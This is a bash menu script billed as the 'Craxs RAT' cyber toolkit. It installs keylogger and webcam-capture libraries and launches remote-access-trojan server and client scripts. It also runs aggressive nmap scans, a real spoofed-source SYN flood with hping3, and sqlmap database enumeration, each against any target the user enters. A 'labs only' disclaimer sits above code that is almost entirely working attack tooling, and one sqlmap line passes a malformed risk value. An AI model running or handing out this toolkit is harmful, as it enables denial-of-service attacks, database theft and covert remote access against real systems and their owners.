#!/bin/bash

# aaayafuj Craxs RAT Access - Final Edition with Nmap, DDoS Sim, SQLMap
# Author: Yafet Tesfahuney
# Use this script for CTFs, labs, ethical hacking — not for unauthorized attacks.

GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
RESET="\e[0m"

banner() {
    clear
    echo -e "${GREEN}"
    echo "   ___           __                     _      "
    echo "  / _ | ___ ____/ /  ___ ____ ___  ___ (_)__ _ "
    echo " / __ |/ _ \`/ _  /__/ _ \`/ _ \`/ _ \/ _ \\/ / _ \`/ "
    echo "/_/ |_/_//_/\\_,_/(_)\\_,_/\\_, /_//_/_//_/_/\\_,_/  "
    echo "                       /___/                   "
    echo -e "${RESET}"
    echo -e "${YELLOW}aaayafuj Craxs RAT | Full Cyber Toolkit: RAT + DDoS + SQLi${RESET}"
    echo
}

dependencies() {
    echo -e "${GREEN}[+] Installing packages...${RESET}"
    sudo apt update
    sudo apt install -y git python3 python3-pip openssl build-essential hping3 nmap sqlmap
    pip3 install Flask pyxhook pynput opencv-python cryptography
    echo -e "${GREEN}[+] All tools ready.${RESET}"
}

gen_ssl() {
    echo -e "${YELLOW}[+] Creating SSL cert...${RESET}"
    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    echo -e "${GREEN}[+] Certs created: key.pem & cert.pem${RESET}"
}

nmap_ddos_sim() {
    read -p "Target IP or Domain: " target
    echo -e "${RED}[!] Nmap DDoS-style scan (for stress & CTF testing only)${RESET}"
    nmap -T5 -A -Pn -p- --max-rate 1000 $target
    echo -e "${GREEN}[+] Scan complete.${RESET}"
}

real_ddos_sim() {
    echo -e "${RED}[!] ETHICAL USE ONLY — This sends real flood packets.${RESET}"
    read -p "Target IP: " target
    read -p "Target Port: " port
    read -p "Duration (seconds): " duration
    hping3 -S --flood -V -p $port $target --rand-source &
    sleep $duration
    pkill hping3
    echo -e "${GREEN}[+] Attack stopped.${RESET}"
}

sqlmap_attack() {
    read -p "Target URL (with vulnerable GET param): " url
    echo -e "${YELLOW}[+] Launching SQLMap injection test...${RESET}"
    sqlmap -u "$url" --batch --dbs
    sqlmap -u "$url" --batch --dbs --risk=5 --risk=3
    sqlmap -u "$url" --banner 
    echo -e "${GREEN}[+] SQLi scan done.${RESET}"
}

run_rat() {
    echo -e "${YELLOW}[+] RAT Options:${RESET}"
    echo "1) Run Server"
    echo "2) Run Client"
    echo "3) Back"
    read -p "Choice: " rat_opt
    case $rat_opt in
        1) python3 rat_server.py ;;
        2) python3 rat_client.py ;;
        *) echo "Back..." ;;
    esac
}

while true; do
    banner
    echo "1) Install Dependencies"
    echo "2) Generate SSL Cert"
    echo "3) Run RAT Server/Client"
    echo "4) Nmap DDoS-Style Scan (CTF)"
    echo "5) Real SYN Flood with hping3 (LAB only)"
    echo "6) Run SQLMap Injection Test"
    echo "0) Exit"
    echo
    read -p "Select option: " choice

    case $choice in
        1) dependencies ;;
        2) gen_ssl ;;
        3) run_rat ;;
        4) nmap_ddos_sim ;;
        5) real_ddos_sim ;;
        6) sqlmap_attack ;;
        0) echo -e "${RED}Goodbye hacker.${RESET}"; exit ;;
        *) echo -e "${RED}Invalid option.${RESET}" ;;
    esac
done
